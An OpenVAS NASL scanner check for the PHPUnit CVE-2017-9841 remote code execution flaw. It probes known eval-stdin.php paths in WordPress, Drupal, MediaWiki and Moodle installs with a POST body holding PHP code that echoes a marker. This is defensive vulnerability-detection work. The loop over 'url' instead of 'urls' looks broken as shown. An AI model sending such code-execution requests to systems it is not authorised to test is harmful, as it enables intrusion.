###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpunit_rce.nasl 14161 2019-03-13 17:56:04Z cfischer $
#
# PHPUnit 'CVE-2017-9841' Remote Code Execution Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108439");
  script_version("$Revision: 14161 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-13 18:56:04 +0100 (Wed, 13 Mar 2019) $");
  script_tag(name:"creation_date", value:"2018-04-14 15:29:22 +0200 (Sat, 14 Apr 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2017-9841");
  script_bugtraq_id(101798);
  script_name("PHPUnit 'CVE-2017-9841' Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "drupal_detect.nasl",
                      "secpod_mediawiki_detect.nasl", "gb_moodle_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://phpunit.vulnbusters.com/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/101798");
  script_xref(name:"URL", value:"https://moodle.org/mod/forum/discuss.php?d=358588");
  script_xref(name:"URL", value:"https://lists.wikimedia.org/pipermail/mediawiki-announce/2017-November/000216.html");

  script_tag(name:"summary", value:"PHPUnit is prone to an arbitrary code-execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in
  the context of the user running the affected applications.");

  script_tag(name:"insight", value:"The flaw exist because Util/PHP/eval-stdin.php in PHPUnit allows
  remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a '<?php ' substring,
  as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the
  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.");

  script_tag(name:"affected", value:"PHPUnit before 4.8.28 and 5.x before 5.6.3.");

  script_tag(name:"solution", value:"Update to PHPUnit 4.8.28, 5.6.3 or later. Some vendors shipping
  PHPUnit have released updates. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_timeout(600);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) )
  exit(0);

urls = make_list();

# First fill the known location of a few CMS and CMS plugins shipping this files
# The location here are fixed / known
wpdirs = get_app_location( port:port, cpe:"cpe:/a:wordpress:wordpress", nofork:TRUE );
if( wpdirs ) {
  foreach wpdir( wpdirs ) {
    if( wpdir == "/" ) wpdir = "";
    urls = make_list( urls,
                      # https://wordpress.org/support/topic/malicious-files-detected-in-plugin-after-installing/
                      wpdir + "/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                      wpdir + "/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

drdirs = get_app_location( port:port, cpe:"cpe:/a:drupal:drupal", nofork:TRUE );
if( drdirs ) {
  foreach drdir( drdirs ) {
    if( drdir == "/" ) drdir = "";
    urls = make_list( urls,
                      # https://www.drupal.org/project/mailchimp/issues/2946280
                      drdir + "/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# https://github.com/wikimedia/mediawiki/blob/1.30.0/maintenance/update.php#L173
mwdirs = get_app_location( port:port, cpe:"cpe:/a:mediawiki:mediawiki", nofork:TRUE );
if( mwdirs ) {
  foreach mwdir( mwdirs ) {
    if( mwdir == "/" ) mwdir = "";
    urls = make_list( urls,
                      mwdir + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

# https://moodle.org/mod/forum/discuss.php?d=358588
modirs = get_app_location( port:port, cpe:"cpe:/a:moodle:moodle", nofork:TRUE );
if( modirs ) {
  foreach modir( modirs ) {
    if( modir == "/" ) modir = "";
    urls = make_list( urls,
                      modir + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" );
  }
}

#nb: The final list with the directories from webmirror.nasl and DDI_Directory_Scanner.nasl.
files = make_list(
# Installed via composer
"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
# Directly used / installed or additional known locations
"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/vendor/phpunit/src/Util/PHP/eval-stdin.php",
"/vendor/phpunit/Util/PHP/eval-stdin.php",
"/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/phpunit/src/Util/PHP/eval-stdin.php",
"/phpunit/Util/PHP/eval-stdin.php",
"/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/phpunit/Util/PHP/eval-stdin.php",
"/lib/phpunit/src/Util/PHP/eval-stdin.php",
"/lib/phpunit/Util/PHP/eval-stdin.php" );

foreach dir( make_list( "/", cgi_dirs( port:port ) ) ) {
  if( dir == "/" ) dir = "";
  foreach file( files ) {
    urls = make_list( urls, file );
  }
}

# ...and make it "unique" so we don't check duplicated folders
urls = make_list_unique( urls );

vtstrings = get_vt_strings();
check = vtstrings["default"] + " RCE Test";
check64 = base64( str:check );
data = '<?php echo(base64_decode("' + check64 + '"));';

foreach url( url ) {

  req  = http_post_req( port:port, url:url, data:data,
                        accept_header:"*/*",
                        add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( res && check >< res ) {

    info['"HTTP POST" body'] = data;
    info['URL'] = report_vuln_url( port:port, url:url, url_only:TRUE );

    report  = 'By doing the following request:\n\n';
    report += text_format_table( array:info ) + '\n';
    report += 'it was possible to execute the "echo" command.';
    report += '\n\nResult:\n\n' + res;

    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
    security_message( port:port, data:report, expert_info:expert_info );
    exit( 0 );
  }
}

exit( 99 );